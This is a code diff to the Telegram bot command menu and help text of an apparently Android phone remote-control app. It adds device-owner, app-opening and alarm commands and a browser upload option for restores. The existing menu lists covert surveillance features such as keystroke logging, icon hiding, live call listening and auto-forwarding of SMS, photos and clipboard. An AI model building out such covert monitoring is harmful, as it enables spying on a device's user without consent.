@@ -2675,13 +2675,13 @@ object TelegramBotManager {
         val sections = listOf(
             Section("🔍 Search & Help", listOf("s","help","commands")),
             Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
-            Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber")),
+            Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber","contactgroups")),
             Section("📁 Files & Storage", listOf("files","storage","docs","filehash","deletefile")),
             Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
             Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
             Section("📦 Backup & Restore", listOf("backup","restore")),
             Section("📊 Device Info", listOf("device","battery","batteryhistory","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
-            Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
+            Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot","datasettings","bedtime","setalarm","wake")),
             Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
             Section("🛰 Tracking & Monitoring", listOf("track","livelocation","tracklocation","keystrokes","keytop","geofence","forwardgeofence","timeline")),
             Section("⚙️ Automation", listOf("automations","newrule","newschedule","delrule","runrule","togglerule")),
@@ -2689,7 +2689,7 @@ object TelegramBotManager {
             Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
             Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
-            Section("🔐 Security & Settings", listOf("appsettings","applocker","hideicon","applock","biometric","appinfog","setpin","removepin","botpassword","setbotpassword","securityqa","update","intruders","openperms","reqperm")),
+            Section("🔐 Security & Settings", listOf("appsettings","applocker","hideicon","applock","biometric","appinfog","setpin","removepin","botpassword","setbotpassword","securityqa","update","intruders","openperms","reqperm","openapp","openappinfo","openwebsettings","openpage","deviceowner")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
@@ -6227,9 +6227,10 @@ object TelegramBotManager {
                 append("• /backup — Create a full backup (.plain zip) of all app data and send it here\n")
                 append("  If the backup is &gt;50 MB a one-time download link is sent instead.\n")
                 append("  Inline buttons: <b>📥 As .zip file</b> (force-zip), <b>🔄 Rebuild now</b> (re-run backup)\n")
-                append("• /restore — Two ways to restore:\n")
+                append("• /restore — Three ways to restore:\n")
                 append("  <b>Option 1:</b> Send a <code>.plain</code>/<code>.zip</code> file directly (≤20 MB Telegram limit).\n")
                 append("  <b>Option 2:</b> <code>/restore &lt;url&gt;</code> — phone downloads backup from any direct URL, no size limit.\n")
+                append("  <b>Option 3:</b> Tap <b>📤 Upload from browser</b> button — opens a one-time upload form in your browser (30 min link); drag-drop any size file, no Telegram limit.\n")
                 append("  Bot unpacks, shows per-category counts and restarts automatically.\n")
                 append("\n")
                 append("💡 <i>Live alerts auto-forward for calls, SMS, notifications & location.</i>")
